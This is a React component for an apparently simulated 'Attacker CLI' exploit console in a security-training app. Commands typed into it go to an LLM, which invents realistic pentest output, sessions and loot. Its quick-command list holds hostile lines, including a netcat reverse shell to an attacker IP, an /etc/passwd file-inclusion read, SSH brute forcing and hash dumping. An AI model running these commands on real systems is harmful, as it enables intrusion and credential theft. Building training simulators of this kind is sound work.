import React, { useState, useRef, useEffect } from 'react';
import { Terminal, Loader2, Trash2, ChevronRight, Crosshair, Database, Key, Server, Zap } from 'lucide-react';
import { base44 } from '@/api/base44Client';

// ── colour palette ──────────────────────────────────────────────────────────
const C = {
  prompt:  'text-red-400',
  host:    'text-primary',
  path:    'text-cyan-400',
  success: 'text-green-400',
  error:   'text-red-400',
  info:    'text-cyan-400',
  warn:    'text-amber-400',
  dim:     'text-slate-500',
  normal:  'text-slate-300',
  system:  'text-purple-400',
};

const COLOR_MAP = { success: C.success, error: C.error, info: C.info, warn: C.warn, dim: C.dim, normal: C.normal, system: C.system };

// ── exploit quick-commands (shown as clickable chips) ───────────────────────
const EXPLOIT_CHIPS = [
  { label: 'Recon',           cmd: 'nmap -sV -sC TARGET_IP' },
  { label: 'SQLi probe',      cmd: "sqlmap -u http://TARGET_IP/login --forms --batch" },
  { label: 'Dir bust',        cmd: 'gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/common.txt' },
  { label: 'SSH brute',       cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP' },
  { label: 'SMB enum',        cmd: 'enum4linux -a TARGET_IP' },
  { label: 'LFI test',        cmd: 'curl "http://TARGET_IP/page?file=../../../etc/passwd"' },
  { label: 'Reverse shell',   cmd: 'nc -e /bin/bash ATTACKER_IP 4444' },
  { label: 'Priv esc check',  cmd: './linpeas.sh | tee /tmp/pe.txt' },
  { label: 'Dump hashes',     cmd: 'python3 secretsdump.py -hashes :TARGET_HASH TARGET_IP' },
  { label: 'Pivot via SSH',   cmd: 'ssh -L 8080:INTERNAL_HOST:80 user@TARGET_IP' },
];

// ── local commands (no AI needed) ────────────────────────────────────────────
function localCmd(cmd, ctx) {
  const parts = cmd.trim().split(/\s+/);
  const base  = parts[0].toLowerCase();

  if (base === 'clear')  return { clear: true };
  if (base === 'whoami') return { lines: [{ text: 'root', color: C.success }] };
  if (base === 'id')     return { lines: [{ text: 'uid=0(root) gid=0(root) groups=0(root)', color: C.normal }] };
  if (base === 'pwd')    return { lines: [{ text: ctx.cwd, color: C.normal }] };
  if (base === 'cd') {
    return { lines: [{ text: '', color: '' }], updateCtx: { cwd: parts[1] || '~' } };
  }
  if (base === 'ls') return {
    lines: [{ text: 'exploits/  loot/  pivots/  wordlists/  tools/  scripts/', color: C.success }]
  };
  if (base === 'uname') return {
    lines: [{ text: 'Linux kali 6.1.0-kali9-amd64 #1 SMP x86_64 GNU/Linux', color: C.normal }]
  };
  if (base === 'sessions') {
    if (ctx.sessions.length === 0) return { lines: [{ text: 'No active sessions.', color: C.dim }] };
    return {
      lines: [
        { text: 'Active sessions:', color: C.info },
        ...ctx.sessions.map((s, i) => ({ text: `  [${i + 1}] ${s.type} → ${s.host} (${s.user})`, color: C.success })),
      ]
    };
  }
  if (base === 'loot') {
    if (ctx.loot.length === 0) return { lines: [{ text: 'Loot bag is empty.', color: C.dim }] };
    return {
      lines: [
        { text: 'Loot collected:', color: C.warn },
        ...ctx.loot.map(l => ({ text: `  • ${l}`, color: C.normal })),
      ]
    };
  }
  if (base === 'pivots') {
    if (ctx.pivots.length === 0) return { lines: [{ text: 'No pivot paths discovered yet.', color: C.dim }] };
    return {
      lines: [
        { text: 'Known pivot paths:', color: C.info },
        ...ctx.pivots.map(p => ({ text: `  ⇒ ${p}`, color: C.path })),
      ]
    };
  }
  if (base === 'help') return {
    lines: [
      { text: '┌─ Attacker CLI Commands ──────────────────────────────┐', color: C.host },
      { text: '│  Simulation-aware commands:                          │', color: C.dim },
      { text: '│  sessions      — list obtained shells/sessions       │', color: C.normal },
      { text: '│  loot          — show dumped credentials/data        │', color: C.normal },
      { text: '│  pivots        — discovered pivot paths              │', color: C.normal },
      { text: '│  cd <dir>      — change directory                    │', color: C.normal },
      { text: '│  clear         — clear screen                       │', color: C.normal },
      { text: '│                                                      │', color: C.dim },
      { text: '│  Any pentest tool (nmap, sqlmap, hydra, etc.)        │', color: C.normal },
      { text: '│  will be AI-simulated against the active target.     │', color: C.normal },
      { text: '│  Use ↑/↓ for history, Tab for autocomplete.         │', color: C.dim },
      { text: '└──────────────────────────────────────────────────────┘', color: C.host },
    ]
  };

  return null; // needs AI
}

// ── AI commands ───────────────────────────────────────────────────────────────
const AI_TOOLS = [
  'nmap','masscan','ping','traceroute','ssh','ftp','curl','wget','nc','netcat',
  'sqlmap','nikto','gobuster','dirb','wfuzz','hydra','medusa','john','hashcat',
  'msfconsole','msfvenom','exploit','payload','enum4linux','smbclient','rpcclient',
  'ldapsearch','crackmapexec','secretsdump','linpeas','winpeas','impacket',
  'aircrack-ng','tcpdump','arp','dig','nslookup','whois','netstat','ss','ip',
  'python3','python','bash','sh','powershell','cmd','reg','net','whoami',
];

function isAITool(cmd) {
  const base = cmd.trim().split(/\s+/)[0].toLowerCase().replace('./', '');
  return AI_TOOLS.includes(base);
}

// ── Prompt component ──────────────────────────────────────────────────────────
function Prompt({ cwd = '~' }) {
  return (
    <span className="font-mono text-xs select-none">
      <span className={C.prompt}>root</span>
      <span className={C.dim}>@</span>
      <span className={C.host}>kali</span>
      <span className={C.dim}>:</span>
      <span className={C.path}>{cwd}</span>
      <span className="text-white">$ </span>
    </span>
  );
}

// ── Context state bar ─────────────────────────────────────────────────────────
function ContextBar({ ctx }) {
  return (
    <div className="flex items-center gap-3 px-3 py-1.5 bg-[#0d1a0d] border-b border-primary/20 text-[10px] font-mono overflow-x-auto">
      <span className="flex items-center gap-1 text-green-500 shrink-0">
        <Crosshair className="w-3 h-3" />
        {ctx.target ? `${ctx.target.ip}` : <span className="text-slate-600">no target</span>}
      </span>
      <span className="text-slate-600">|</span>
      <span className="flex items-center gap-1 text-cyan-500 shrink-0">
        <Server className="w-3 h-3" />
        {ctx.sessions.length} session{ctx.sessions.length !== 1 ? 's' : ''}
      </span>
      <span className="text-slate-600">|</span>
      <span className="flex items-center gap-1 text-amber-500 shrink-0">
        <Key className="w-3 h-3" />
        {ctx.loot.length} loot
      </span>
      <span className="text-slate-600">|</span>
      <span className="flex items-center gap-1 text-purple-400 shrink-0">
        <Database className="w-3 h-3" />
        {ctx.pivots.length} pivot{ctx.pivots.length !== 1 ? 's' : ''}
      </span>
      {ctx.stage && (
        <>
          <span className="text-slate-600">|</span>
          <span className="text-primary shrink-0">stage: {ctx.stage}</span>
        </>
      )}
    </div>
  );
}

// ── Main component ────────────────────────────────────────────────────────────
export default function AttackerCLI({ target, isRunning, onLogEmit }) {
  const initCtx = {
    target,
    cwd: '~',
    stage: 'recon',
    sessions: [],
    loot: [],
    pivots: [],
  };

  const [ctx, setCtx] = useState(initCtx);
  const [history, setHistory] = useState([{
    type: 'banner',
    lines: [
      { text: '┌─────────────────────────────────────────────────────────┐', color: C.host },
      { text: '║  ⚡ Attacker CLI — Live Exploit Console                  ║', color: C.host },
      { text: '║  Commands execute against the active simulation target.  ║', color: C.dim },
      { text: '║  Type "help" for commands. Results feed into log stream. ║', color: C.dim },
      { text: '└─────────────────────────────────────────────────────────┘', color: C.host },
      { text: '', color: '' },
    ]
  }]);
  const [input, setInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [cmdHistory, setCmdHistory] = useState([]);
  const [historyIdx, setHistoryIdx] = useState(-1);

  const bottomRef = useRef(null);
  const inputRef  = useRef(null);

  // Sync target into ctx
  useEffect(() => {
    if (!target) return;
    setCtx(prev => ({ ...prev, target }));
    appendHistory({
      type: 'system',
      lines: [
        { text: `[*] Target locked: ${target.name} (${target.ip}) — ${target.os}`, color: C.info },
        { text: `[*] Services: ${target.services.join(', ')}`, color: C.dim },
      ]
    });
  }, [target?.id]);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  const appendHistory = (entry) => setHistory(prev => [...prev, entry]);

  // Replace TARGET_IP / ATTACKER_IP placeholders in chips
  const resolveCmd = (cmd) => {
    let out = cmd;
    if (ctx.target) out = out.replace(/TARGET_IP/g, ctx.target.ip);
    out = out.replace(/ATTACKER_IP/g, '10.10.14.1');
    return out;
  };

  const runCommand = async (rawCmd) => {
    const cmd = rawCmd.trim();
    if (!cmd) return;

    setCmdHistory(prev => [cmd, ...prev].slice(0, 100));
    setHistoryIdx(-1);

    // Echo command
    appendHistory({ type: 'cmd', cmd, cwd: ctx.cwd });

    // Local handler
    const local = localCmd(cmd, ctx);

    if (local?.clear) {
      setHistory([]);
      setInput('');
      return;
    }

    if (local) {
      if (local.updateCtx) setCtx(prev => ({ ...prev, ...local.updateCtx }));
      appendHistory({ type: 'output', lines: local.lines || [] });
      setInput('');
      return;
    }

    // Unknown non-AI tool
    if (!isAITool(cmd)) {
      appendHistory({ type: 'output', lines: [{ text: `bash: ${cmd.split(' ')[0]}: command not found`, color: C.error }] });
      setInput('');
      return;
    }

    if (!ctx.target) {
      appendHistory({ type: 'output', lines: [{ text: 'No target selected. Choose a node first.', color: C.error }] });
      setInput('');
      return;
    }

    setIsLoading(true);
    setInput('');

    const prompt = `You are a cybersecurity red-team terminal simulator (Kali Linux).

ACTIVE TARGET:
  Name: ${ctx.target.name}
  IP:   ${ctx.target.ip}
  OS:   ${ctx.target.os}
  Services: ${ctx.target.services.join(', ')}

ATTACK CONTEXT:
  Current stage: ${ctx.stage}
  Active sessions: ${ctx.sessions.length > 0 ? ctx.sessions.map(s => `${s.type}@${s.host}`).join(', ') : 'none'}
  Known loot: ${ctx.loot.length > 0 ? ctx.loot.join(', ') : 'none'}
  Known pivots: ${ctx.pivots.length > 0 ? ctx.pivots.join(', ') : 'none'}

COMMAND EXECUTED:
  ${cmd}

Simulate realistic terminal output (max 30 lines). Rules:
- Output must look like real CLI output for the tool
- Include specific IPs, ports, service versions, paths, CVEs, hashes when relevant
- If exploitation succeeds, include a realistic shell prompt or confirmation
- Be consistent with previous attack context
- If a new session is obtained, set new_session to the session details
- If credentials or sensitive data are found, add to loot_found
- If new internal hosts are discovered, add to pivot_discovered
- Update attack_stage to reflect the next logical phase (recon → exploit → pivot → persistence → exfil)

Return JSON:
{
  "lines": [{ "text": "...", "type": "normal"|"success"|"error"|"info"|"warn"|"dim" }],
  "new_session": null | { "type": "shell"|"meterpreter"|"rdp"|"ssh", "host": "ip", "user": "username" },
  "loot_found": [],
  "pivot_discovered": [],
  "attack_stage": "recon|exploit|pivot|persistence|exfil"
}`;

    const result = await base44.integrations.Core.InvokeLLM({
      prompt,
      response_json_schema: {
        type: 'object',
        properties: {
          lines: { type: 'array', items: { type: 'object', properties: { text: { type: 'string' }, type: { type: 'string' } } } },
          new_session: { type: 'object', properties: { type: { type: 'string' }, host: { type: 'string' }, user: { type: 'string' } } },
          loot_found: { type: 'array', items: { type: 'string' } },
          pivot_discovered: { type: 'array', items: { type: 'string' } },
          attack_stage: { type: 'string' },
        }
      }
    });

    setIsLoading(false);

    const lines = (result.lines || []).map(l => ({
      text: l.text,
      color: COLOR_MAP[l.type] || C.normal,
    }));

    appendHistory({ type: 'output', lines });

    // Update context with discovered data
    setCtx(prev => {
      const next = { ...prev };
      if (result.new_session) {
        next.sessions = [...prev.sessions, result.new_session];
      }
      if (result.loot_found?.length) {
        next.loot = [...new Set([...prev.loot, ...result.loot_found])];
      }
      if (result.pivot_discovered?.length) {
        next.pivots = [...new Set([...prev.pivots, ...result.pivot_discovered])];
      }
      if (result.attack_stage) next.stage = result.attack_stage;
      return next;
    });

    // Emit representative logs back to the main simulation terminal
    if (onLogEmit) {
      const summaryLines = lines.slice(0, 4);
      summaryLines.forEach(l => {
        onLogEmit({
          time: new Date().toISOString(),
          type: l.color === C.success ? 'attacker' : l.color === C.error ? 'firewall' : 'attacker',
          source: 'CLI',
          message: `[CLI] ${l.text}`,
        });
      });
      if (result.new_session) {
        onLogEmit({
          time: new Date().toISOString(),
          type: 'attacker',
          source: 'CLI',
          message: `[CLI] ⚠ New ${result.new_session.type} session opened → ${result.new_session.user}@${result.new_session.host}`,
        });
      }
    }
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      runCommand(input);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      const idx = Math.min(historyIdx + 1, cmdHistory.length - 1);
      setHistoryIdx(idx);
      setInput(cmdHistory[idx] || '');
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      const idx = Math.max(historyIdx - 1, -1);
      setHistoryIdx(idx);
      setInput(idx === -1 ? '' : cmdHistory[idx] || '');
    } else if (e.key === 'Tab') {
      e.preventDefault();
      const match = AI_TOOLS.find(c => c.startsWith(input.toLowerCase().split(' ')[0]));
      if (match) setInput(match + ' ');
    }
  };

  return (
    <div
      className="bg-[#0d1117] border border-border rounded-2xl overflow-hidden flex flex-col"
      style={{ minHeight: 480 }}
      onClick={() => inputRef.current?.focus()}
    >
      {/* Title bar */}
      <div className="flex items-center gap-2 px-4 py-2.5 bg-[#161b22] border-b border-border shrink-0">
        <div className="flex gap-1.5">
          <div className="w-3 h-3 rounded-full bg-red-500/70" />
          <div className="w-3 h-3 rounded-full bg-amber-400/70" />
          <div className="w-3 h-3 rounded-full bg-primary/70" />
        </div>
        <Zap className="w-3.5 h-3.5 text-red-400 ml-2" />
        <span className="text-xs font-mono text-muted-foreground flex-1">
          attacker@kali — exploit console
          {ctx.target && <span className="text-red-400/70 ml-2">→ {ctx.target.ip}</span>}
        </span>
        {isLoading && <Loader2 className="w-3.5 h-3.5 text-red-400 animate-spin" />}
        <button
          onClick={e => { e.stopPropagation(); setHistory([]); }}
          className="text-muted-foreground hover:text-foreground p-1 transition-colors"
          title="Clear"
        >
          <Trash2 className="w-3.5 h-3.5" />
        </button>
      </div>

      {/* Context bar */}
      <ContextBar ctx={ctx} />

      {/* Quick-exploit chips */}
      <div className="flex items-center gap-1.5 px-3 py-2 bg-[#0d1117] border-b border-border/40 overflow-x-auto shrink-0">
        {EXPLOIT_CHIPS.map(chip => (
          <button
            key={chip.label}
            onClick={() => { const c = resolveCmd(chip.cmd); setInput(c); inputRef.current?.focus(); }}
            className="text-[10px] font-mono whitespace-nowrap bg-red-950/40 border border-red-900/40 text-red-300 hover:bg-red-900/40 hover:border-red-500/50 px-2 py-0.5 rounded-md transition-all flex-shrink-0"
          >
            {chip.label}
          </button>
        ))}
      </div>

      {/* Output area */}
      <div className="flex-1 overflow-y-auto p-3 space-y-0.5 font-mono text-xs" style={{ minHeight: 280 }}>
        {history.map((entry, i) => {
          if (entry.type === 'banner' || entry.type === 'output' || entry.type === 'system') {
            return (
              <div key={i} className="space-y-0.5">
                {entry.lines.map((l, j) => (
                  <div key={j} className={`leading-relaxed ${l.color || C.normal}`}>{l.text}</div>
                ))}
              </div>
            );
          }
          if (entry.type === 'cmd') {
            return (
              <div key={i} className="flex items-start gap-1 mt-2">
                <Prompt cwd={entry.cwd} />
                <span className="text-white break-all">{entry.cmd}</span>
              </div>
            );
          }
          return null;
        })}
        {isLoading && (
          <div className="flex items-center gap-2 text-red-400 text-xs mt-1 ml-1">
            <span className="animate-pulse font-bold">▋</span>
            <span className="text-muted-foreground">Simulating exploit…</span>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      {/* Input */}
      <div className="flex items-center gap-2 px-3 py-2.5 border-t border-border bg-[#0a0f0a] shrink-0">
        <Prompt cwd={ctx.cwd} />
        <input
          ref={inputRef}
          value={input}
          onChange={e => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          disabled={isLoading}
          className="flex-1 bg-transparent outline-none text-white font-mono text-xs caret-red-400 placeholder-slate-700 disabled:opacity-40"
          placeholder={ctx.target ? `exploit ${ctx.target.ip}…` : 'select a target first…'}
          autoComplete="off"
          spellCheck={false}
        />
        {input && (
          <button onClick={() => runCommand(input)} disabled={isLoading} className="text-red-400 hover:text-red-300 transition-colors disabled:opacity-40">
            <ChevronRight className="w-4 h-4" />
          </button>
        )}
      </div>
    </div>
  );
}